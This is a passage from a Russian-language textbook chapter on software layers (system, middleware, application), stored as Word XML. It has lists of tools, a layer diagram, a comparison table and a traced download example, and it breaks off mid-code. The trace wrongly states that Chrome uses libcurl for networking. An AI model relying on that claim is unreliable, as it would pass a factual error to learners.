        <w:t>**JVM (Java Virtual Machine)** — виртуальная машина для запуска Java-программ. Код Java компилируется в байт-код, а JVM выполняет его на любой платформе ("Write Once, Run Anywhere"). Минус: жрёт память как не в себя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в) Отладчики и профилировщики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отладчик (Debugger)** — программа для поиска ошибок в коде. Позволяет пошагово выполнять программу, смотреть значения переменных, ставить точки останова.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**gdb** (GNU Debugger) — для C/C++ в Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Visual Studio Debugger** — в Windows, интегрирован в IDE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LLDB** — современный отладчик (используется в Xcode для macOS/iOS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Профилировщик (Profiler)** — анализирует, где программа тратит время и память. Находит узкие места (bottlenecks).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Valgrind** — находит утечки памяти в C/C++.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**perf** — профилировщик Linux.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>г) Middleware (промежуточное ПО)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программы, которые связывают разные компоненты системы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Серверы приложений:** Apache Tomcat (Java), IIS (Windows), nginx (веб-сервер + прокси).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Брокеры сообщений:** RabbitMQ, Kafka — для передачи данных между микросервисами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Базы данных:** PostgreSQL, MySQL, MongoDB (подробнее в главе 7).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто пишет:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> системные программисты и разработчики инструментов. Языки: C, C++, Rust, Go.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Написал программу на C++. Компилятор `g++` превратил код в исполняемый файл. Программа использует библиотеку `libc` для работы с файлами. Библиотека `libc` вызывает системные вызовы (system calls) ядра Linux. Ядро обращается к драйверу диска. Драйвер управляет контроллером SSD. Контроллер записывает данные на флеш-память. Вот так слои взаимодействуют.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Прикладной уровень (Application Software Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программы, которыми пользуется конечный пользователь. Это финальный слой пирога — самый видимый и вкусный.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы прикладного ПО:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>а) ПО общего назначения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программы для широкого круга задач.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Текстовые редакторы и офисные пакеты:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Microsoft Office (Word, Excel, PowerPoint) — стандарт в корпорациях.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LibreOffice / OpenOffice — бесплатная альтернатива (совместима с форматами MS Office).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google Docs — облачный редактор (работает в браузере, автосохранение, совместная работа).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузеры:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Chrome (Chromium) — 65% рынка (2025), но жрёт RAM как не в себя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Firefox — уважение за приватность, но доля рынка падает (~3%).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Safari — встроенный в macOS/iOS, оптимизирован под Apple Silicon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Edge — браузер Microsoft на движке Chromium (неожиданно неплохой).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Медиаплееры:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>VLC — воспроизводит всё, даже полуразбитые файлы (легенда).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Spotify — стриминг музыки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>YouTube — стриминг видео (и рекламы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>б) Специализированное ПО</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программы для конкретных задач (профессиональные инструменты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разработка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IDE (Integrated Development Environment):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Visual Studio Code (VS Code) — лёгкий, расширяемый, бесплатный. Самая популярная IDE (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JetBrains (PyCharm, IntelliJ IDEA, WebStorm) — мощные, платные (есть бесплатные версии).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Visual Studio — монстр от Microsoft для C++/C#.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Xcode — для разработки под macOS/iOS (только на Mac).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системы контроля версий:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Git — стандарт индустрии. GitHub, GitLab, Bitbucket.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Графика и дизайн:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Adobe Creative Suite:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Photoshop — редактор растровой графики (фото, дизайн).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Illustrator — векторная графика (логотипы, иллюстрации).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Premiere Pro — видеомонтаж.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Альтернативы (бесплатные):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GIMP — редактор растровой графики (замена Photoshop).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Inkscape — векторная графика (замена Illustrator).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DaVinci Resolve — профессиональный видеомонтаж (бесплатная версия мощная).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blender — 3D-моделирование, анимация, рендеринг (бесплатный, но крутой — фильмы и игры делают).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инженерия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CAD (Computer-Aided Design):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>AutoCAD — проектирование зданий, механизмов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SolidWorks — 3D-моделирование для инженеров.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FreeCAD — бесплатная альтернатива.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Симуляторы:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MATLAB — математическое моделирование (студенты физтеха, привет).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Simulink — моделирование динамических систем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Игры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GTA V, Cyberpunk 2077, Elden Ring, Counter-Strike 2, Dota 2, League of Legends, Minecraft (самая продаваемая игра в истории — 300+ млн копий).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в) Встроенное ПО (Firmware)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программы, зашитые в устройства.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роутеры:** прошивки на базе Linux (OpenWrt, DD-WRT).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принтеры:** управление печатью.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Смарт-часы:** watchOS (Apple Watch), Wear OS (Google).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Умные колонки:** Alexa (Amazon), Google Assistant, Алиса (Яндекс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто пишет:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> прикладные программисты. Языки: Python, JavaScript, Java, C#, Swift, Kotlin, TypeScript.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Визуализация уровней</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  ПРИКЛАДНОЙ УРОВЕНЬ                        │</w:t>
        <w:br/>
        <w:t>│  - Игры, браузеры, офисные пакеты         │</w:t>
        <w:br/>
        <w:t>│  - IDE, графические редакторы              │</w:t>
        <w:br/>
        <w:t>│  - Калькулятор, который никто не юзает     │</w:t>
        <w:br/>
        <w:t>└────────────────────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ↕ (API, библиотеки)</w:t>
        <w:br/>
        <w:t>┌────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  СЕРВИСНЫЙ УРОВЕНЬ (Middleware)            │</w:t>
        <w:br/>
        <w:t>│  - Библиотеки (libc, WinAPI, DirectX)     │</w:t>
        <w:br/>
        <w:t>│  - Компиляторы (GCC, Clang, javac)        │</w:t>
        <w:br/>
        <w:t>│  - Отладчики (gdb, Visual Studio)         │</w:t>
        <w:br/>
        <w:t>│  - Серверы приложений (nginx, Tomcat)     │</w:t>
        <w:br/>
        <w:t>└────────────────────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ↕ (системные вызовы)</w:t>
        <w:br/>
        <w:t>┌────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  СИСТЕМНЫЙ УРОВЕНЬ                         │</w:t>
        <w:br/>
        <w:t>│  - Операционная система (Linux, Windows)  │</w:t>
        <w:br/>
        <w:t>│  - Драйверы (видеокарта, принтер, мышь)   │</w:t>
        <w:br/>
        <w:t>│  - Системные утилиты (архиваторы, AV)     │</w:t>
        <w:br/>
        <w:t>└────────────────────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ↕ (инструкции процессора)</w:t>
        <w:br/>
        <w:t>┌────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  АППАРАТНЫЙ УРОВЕНЬ                        │</w:t>
        <w:br/>
        <w:t>│  - CPU, RAM, SSD, GPU, сетевая карта      │</w:t>
        <w:br/>
        <w:t>│  - BIOS/UEFI (прошивка)                    │</w:t>
        <w:br/>
        <w:t>└────────────────────────────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.2. Разница между системным, сервисным и прикладным ПО</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение уровней</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Критерий                | Системное ПО                     | Сервисное ПО                      | Прикладное ПО                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------------------------|----------------------------------|-----------------------------------|------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">          | Управление железом               | Инструменты для разработки        | Решение задач пользователя         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">             | ОС, драйверы, антивирусы         | Компиляторы, API, библиотеки      | Браузеры, игры, офисные пакеты    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень абстракции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  | Низкий (близко к железу)         | Средний                           | Высокий (далеко от железа)         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Язык программирования</w:t>
      </w:r>
      <w:r>
        <w:t>| C, C++, Assembly, Rust          | C, C++, Java, Rust, Go            | Python, Java, C#, JavaScript       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто пользуется</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Все программы                    | Разработчики                      | Конечные пользователи              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка может привести</w:t>
      </w:r>
      <w:r>
        <w:t>| Краш системы (BSOD, kernel panic)| Краш приложения                   | Потеря данных, неудобство          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время разработки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Годы (ядро Linux — 30+ лет)      | Месяцы-годы                       | Недели-месяцы                      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системное ПО:** Драйвер видеокарты NVIDIA. Если он крашнется — экран погаснет, ОС может упасть.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервисное ПО:** Библиотека OpenGL. Если она работает криво — игра будет лагать или вылетать, но ОС выживет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладное ПО:** Игра Cyberpunk 2077. Если она крашнется — закроется окно игры, больше ничего не пострадает (кроме твоих нервов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взаимодействие уровней: пример цепочки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ты кликаешь мышкой в браузере Chrome на кнопку "Скачать файл".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладной уровень:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Chrome (прикладное ПО) обрабатывает клик, отправляет HTTP-запрос на сервер.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использует библиотеку **libcurl** (сервисный уровень) для работы с сетью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервисный уровень:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Библиотека `libcurl` формирует HTTP-запрос, вызывает системный вызов `socket()` для создания сетевого соединения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный уровень:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ядро Linux получает системный вызов, обращается к драйверу сетевой карты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер отправляет данные через сетевую карту.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратный уровень:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сетевая карта (Ethernet / Wi-Fi) физически передаёт пакеты данных по проводу/воздуху.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обратный путь:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер отвечает → пакеты приходят → сетевая карта → драйвер → ядро → `libcurl` → Chrome → файл сохраняется на диск.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Один клик мышкой = десятки тысяч операций на всех уровнях. Слоёный пирог работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.3. Сервисное ПО: детальный разбор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сервисное ПО — это прослойка между системой и приложениями. Разработчики используют его, чтобы не писать всё с нуля.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>API и библиотеки: зачем изобретать велосипед?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>API (Application Programming Interface)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это контракт: "Вызови функцию `X` с параметрами `Y`, и получишь результат `Z`". Программист не знает (и не хочет знать), как функция работает внутри — главное, что она работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Стандартная библиотека C (libc)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хочешь вывести текст на экран? Используй `printf()`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    printf("Hello, World!\n");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит внутри:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`printf()` форматирует строку.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вызывает системный вызов `write()` для вывода в консоль.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ядро ОС передаёт данные драйверу терминала.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер отображает текст на экране.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ты написал одну строку, а за кулисами — десятки функций и три уровня абстракции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: WinAPI (Windows API)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Создать окно в Windows:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;windows.h&gt;</w:t>
        <w:br/>
        <w:br/>
